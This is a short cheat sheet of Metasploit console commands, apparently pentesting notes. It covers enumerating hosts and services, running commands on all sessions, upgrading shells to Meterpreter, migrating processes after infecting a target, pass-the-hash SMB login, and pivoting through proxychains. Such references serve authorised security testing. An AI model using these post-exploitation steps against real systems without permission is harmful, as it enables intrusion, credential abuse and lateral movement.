### Source
https://github.com/rapid7/metasploit-framework  

### Execute before start of msfconsole
```
msf> systemctl start postgresql
```

### Initiate db
```
msf> msfdb init
```

### Check status
```
msf> db_status
```

### List windows 2008 server
```
msf> hosts -u -S 2008
```

### Show services of specific host
```
msf> services <rhost>
```

### Set rhosts for specific open port
```
msf> services -R -u -p <rport>
```

### Export services to file
```
msf> services -u -o <file>
```

### Execute command on all sessions
```
msf> sessions -c ipconfig
```

### Upgrade a shell session
```
msf> use post/multi/manage/shell_to_meterpreter
```

### Shortcut for choosing correct handler inside the context of payload module
```
msf> to_handler
```

### Automigrate to another process, directly after infecting target
```
msf> set AutoRunScript post/windows/manage/migrate
```

### Smb_login with ntlm hash
```
ms> set smbpass <nthash:nthash>
```

### Load powershell script into current meterpreter session
```
mtr> powershell_import <localFile>.ps1
```

### Tunnel traffic trough proxy
```
msf> set PROXIES HTTP:127.0.0.1:8080
```

### Pivoting using proxychains
```
msf> auxiliary/server/socks_proxy
msf> set version 4a
msf> route add <ipRange> <sessionId>
msf> run -j
```

### Adjust listening port in vim /etc/proxychains4.con
```
socks4  127.0.0.1 1080
```

